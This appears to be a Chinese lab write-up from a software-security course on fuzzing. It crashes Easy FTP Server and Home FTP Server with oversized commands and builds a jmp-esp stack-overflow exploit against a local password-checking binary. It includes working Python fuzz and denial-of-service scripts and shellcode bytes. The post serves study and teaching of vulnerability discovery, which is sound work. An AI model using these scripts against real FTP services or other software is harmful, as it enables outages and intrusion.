---
title: 漏洞挖掘与模糊测试 date: 2019-11-29 0:06:38 tags:

- "网络空间安全"
- "软件安全"
  categories:
- ["实验","软件安全"]
- ["漏洞","拒绝服务"]
  comments: true

---

## 目标

了解fuzz原理，使用此方法模糊测试两种ftp服务器软件的漏洞，使其停止工作。
<!-- more -->

## 测试步骤与结果

### Easy FTP Server的Fuzz过程（FtpFuzz工具法）

1. 打开 Easy FTP Server3.1，点击Start开始服务。 {% asset_img 1.png %}
2. 打开FTP Fuzzer，把USER和PASS的参数改为`anonymous`
   {% note warning %} 不要选中右上角的Fuzz this FTP command {% endnote %} {% grouppicture 2-2 %} {% asset_img 2.png %} {%
   asset_img 3.png %} {% endgrouppicture %}
3. 配置fuzz所用的脏数据，我们的目标是`LIST`指令。 {% grouppicture 2-2 %} {% asset_img 4.png "这回要选中Fuzz this FTP command" %} {% asset_img
   5.png "配置fuzzing data 为..?" %} {% endgrouppicture %}
4. 设置好服务器地址和端口，然后点击start开始。 {% asset_img 6.png %} {% asset_img 7.png %}
5. 在输出中时不时观察到有425错误：不能打开数据连接产生 {% asset_img 8.png %}
6. 出现红色的输出代表着FTP服务器已经宕机 {% asset_img 9.png %} {% asset_img 10.png "服务器端报错印证了这一点" %}
7. 查看同目录下的`ftptrace.txt`，发现是因为输入的命令过长，导致了服务器处理命令时缓冲区溢出，服务宕机。 {% asset_img 11.png %}

### Home FTP Server的Fuzz过程（python脚本法）

{% note fuzz源码 %}

```python fuzz.py
import socket,sys
def ftp_test(ip,port1):
    target = ip
    port = port1
    buf = 'a'*272
    j=1
    fuzzcmd = ['mdelete ','cd ','mkdir ','delete ','cwd ','mdir ','mput ','mls ','rename ','site index ']
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        connct = s.connect((target,port))
        print "[+] Connected!"
    except:
        print "[!] Connection Failed!"
        sys.exit(0)
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS 123456\r\n')
    s.recv(1024)
    print "[+] Sending payload..."
    for i in fuzzcmd:
        s.send(i + buf*j + '\r\n')
        s.send(i + buf*j*4 + '\r\n')
        s.send(i + buf*j*8 + '\r\n')
        s.send(i + buf*j*40 + '\r\n')
        try:
            s.recv(1024)
            print "[!] Fuzz failed!"
        except:
            print "[+] Maybe we find a bug!"

if __name__ == '__main__':
    ftp_test("127.0.0.1",21)
```

{% endnote %}

1. 首先让ollydbg附加进程到ftpserver上 {% asset_img 12.png %}
2. 运行脚本，发现全部输出了`fuzz failed`，但与此同时，ftp服务也停止了。下一次再运行脚本，就会输出`Connection failed`。 {% grouppicture 3-3 %} {% asset_img
   13.png "fuzz failed" %} {% asset_img 16.png "connection failed" %} {% asset_img 15.png "服务也停止了" %} {% endgrouppicture
   %}
3. 查看system log，发现其在接收两次过长参数的`site index`垃圾指令后停止运行。 {% asset_img 17.png %}
4. Homeftpserver发生崩溃时，跳转到`KERNEL32.77399ED8`时产生了异常`0EEDFADE`。 {% asset_img 14.png "系统异常" %}

## 测试结论

* 2.1实际上复现了Quick’n Easy FTP Server Lite Version 3.1远程拒绝服务漏洞[^1]，FTP协议中的`LIST`命令后的用户数据长度如果超过232，同时最后字符以`?`结尾，就会造成这个程序的崩溃。

* 2.2可以通过自己编写的fuzz代码实现对ftp服务器发送脏数据包以实现fuzz攻击，达到让目标服务器崩溃的效果。虽然可以找到崩溃的位置，但本次实验未能探究到崩溃的原因。

## 思考题

1. 初次运行结果如下，用IDA32位打开源程序进行逆向分析。 {% asset_img 思考-1.png %}
2. 整体过程就是加载`user32.dll`，打开`password.txt`读出内容，然后与`"1234567"`作比较，若相等，则通过验证。我们可以看到在`sub_401030`有一个无界写入有界的`strcpy`
   操作，很容易发生溢出，那么我们要怎么知道在什么时候发生溢出呢？ {% note info %} sub_401005仅仅是跳转到了sub_401030 {% endnote %} {% asset_img 思考-2.png %} {%
   asset_img 思考-3.png %}
3. 首先通过fuzz计算“缓冲区”大小。每次向里填充一个字符，最终计算出我们需要填充字符的数量为`11940`比特。在填充满之前，会引发右图所示错误，注意到其中有提示`"ESP was not properly saved"`
   ，说明ESP可能被覆盖掉了 {% note fuzz源码 %}

```python fuzz.py
import os

rpwd = "Congratulation! You have passed the verification!\n"
wpwd = "incorrect password!\n"

def write_file(num):
    with open("password.txt","w+") as fp:
        fp.write("a"*num)
def get_output():
    p=os.popen("overflow_exe.exe")
    return "".join(p.readlines())

def is_valid_output(output):
    try:
        return output in (rpwd,wpwd)
    except:
        return False

def fuzz():
    i = 100
    breakout_num = 0
    for i in range(100,20000,100):
        write_file(i)
        if is_valid_output(get_output()):
            print "[+] Writing {} letters to password.txt".format(i)
            continue
        else:
            for j in range(i-100,i,10):
                write_file(j)
                if is_valid_output(get_output()):
                    print "[+] Writing {} letters to password.txt".format(j)
                    continue
                else:
                    for k in range(j-10,j+1):
                        write_file(k)
                        if is_valid_output(get_output()):
                            print "[+] Writing {} letters to password.txt".format(k)
                            breakout_num=k
                            continue
                        else:
                            breakout_num=k
                            break
                        break
                break
        break
    print "[*] The program broke up after %d bytes of 'a's."%breakout_num
```

{% endnote %} {% grouppicture 2-2 %} {% asset_img 思考-4.png %} {% asset_img 思考-9.png %} {% endgrouppicture %}

4. 还有一个缓冲区？通过ollydbg调试可以看到在检验密码的函数中有一个`MOV,EAX 2EE4`操作，中间取了`[EBP-2EE4]`的有效地址，后面还有一个`ADD,ESP 2EE4`
   操作，可以推断这是再开辟另一块缓冲区，大小为十进制的`12004`字节。 {% asset_img 思考-7.png %}
5. 此时EBP的值为`0x35f20`。 {% asset_img 思考-8.png %}
6. 我们输入的“密码”被复制到了`0x3307c`开头的地址上。`0x35f20-0x3307c=11940`(10进制)，与之前fuzz结果相同，说明`11940`字节一旦占满，程序就会崩溃 {% asset_img 思考-6.png
   %} {% grouppicture 2-2 %} {% asset_img 思考-10.png %} {% asset_img 思考-11.png %} {% endgrouppicture %}
7. 上图是当`11940`个`"a"`被复制时，栈上的情况。可以看到`0x35f20`中的末两位被`11940`个`"a"`字符串的末尾`\0`所占，导致返回地址错误，程序崩溃 {% asset_img 思考-12.png %}
8. 所以这个缓冲区的大小为`11940-4（32位系统的ebp大小）=11936`字节。一旦缓冲区大小被计算出来，就可以根据前几次作业中缓冲区溢出的知识来通过“验证”。
9. 这次仍然利用`jmp esp`地址`77f8948b`作为跳板 {% asset_img 思考-5.png %}
10. Payload最终格式为：填充物（11940个a含4字节ebp）+`jmp_esp`地址+shellcode(`jmp 00401147`) 。构造password文档如下

```python exploit.py
def final_leak():
    shellcode = "\xe9\x1a\xb2\x3c\x00\x90\x90\x90"
    fill_in = "a"*11940+"b"*4
    with open("password.txt","w") as f:
        f.write(fill_in+jmp_esp+shellcode)
```

{% note warning %}

* 但是执行这个shellcode过后跳到了旁边的地址上，没有成功通过验证。只能在跳到`esp`地址后通过修改汇编以跳入验证成功语句中。
* 可能是指令在执行的过程中遇见了坏字符导致其在内存中的值发生了变化，致使执行不成功。
* 但是可以成功溢出，因为在调试的时候已经发现可以陷入内核中，从jmp esp地址中返回程序，shellcode被成功解析了。 {% asset_img 思考-13.png %} {% endnote %}

[^1]: [Quick 'n Easy FTP Server Lite 3.1 - Denial of Service](https://www.exploit-db.com/exploits/12853)
